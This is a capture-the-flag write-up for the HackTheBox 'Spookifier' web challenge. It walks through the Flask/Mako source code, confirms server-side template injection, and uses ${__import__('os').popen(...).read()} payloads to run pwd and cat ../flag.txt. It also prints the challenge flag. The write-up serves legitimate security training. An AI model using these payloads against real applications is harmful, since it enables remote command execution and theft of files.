---
title: HackTheBox Challenge - Spookifier
authors: Samarth
date: 2022-10-28 14:00:00 +0530
categories: [HackTheBox Challenge]
tags: [Web]
math: true
mermaid: true
---

![Banner](/assets/images/htb-chall/Spookifier/banner.png)

## Description

<b>There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?</b>

## Solution

Since this is a web challenge, I began by browsing the target website provided.

![Target Website](/assets/images/htb-chall/Spookifier/1.png)

I typed the name as `test`, and in response, the website gave me the same output in four different fonts.

![Name Spookifier](/assets/images/htb-chall/Spookifier/2.png)

While checking the page source and Network Tab under DevTools, I didn't find anything interesting.

The challenge itself contains some files that are necessary for the challenge. By inspecting the source code of the application, I found that the application is built using `Flask` in Python.

When a user submits the form, a GET request is sent to the root endpoint (`/`) with the submitted Halloween name passed as a query parameter (`text`).

The server handles this input by invoking a function called `spookify`, which then forwards it to another function responsible for formatting the output. The `generate_render()` function ultimately produces the final result, and its implementation is as follows:

**routes.py**
```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

This Flask application uses **Mako templates (`flask_mako`)** and defines a route (`/`) that takes a query parameter `text`. If `text` is provided, it processes the input using the `spookify` function, which likely transforms the text into different fonts or styles. The transformed output is then passed to the `index.html` template via `render_template`.

While inspecting `util.py`, I came across code that transforms a given text into multiple font styles and returns an HTML-rendered table displaying the results. The `spookify` function first calls `change_font`, which converts the input text into different fonts using predefined font mappings (`font1`, `font2`, etc.). The transformed text is then passed to `generate_render()`, which formats it into an HTML table using Mako's `Template.render()`. This setup allows a Flask web application to display the same text in various stylized fonts dynamically.

**util.py**
```python
def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)
```
The `generate_render()` function directly passes the user input into the template without any validation, which hints that the input field is vulnerable to `Server-Side Template Injection (SSTI)`.

I will try a very simple mathematical expression 	`${7*7}` in the input field and wait for the response.

![Template Injection](/assets/images/htb-chall/Spookifier/3.png)

The response is `49` which confirms that the application is vulnerable to `SSTI`.

As we have access to the source code, we know that the flag is stored in a file named `flag.txt`. To read the flag, we first need to determine the current working directory by executing the `pwd` command.

```python
${__import__('os').popen('pwd').read()}
```

![current directory](/assets/images/htb-chall/Spookifier/4.png)

The output revealed that the current directory is `/app`, meaning we need to go up one level to access the `flag.txt` file.

```python
${__import__('os').popen('cat ../flag.txt').read()}
```

![Flag found](/assets/images/htb-chall/Spookifier/5.png)

Flag - 
```ruby
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```

[![Pwned](/assets/images/htb-chall/Spookifier/pwned.png)](https://www.hackthebox.com/achievement/challenge/337503/413)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.



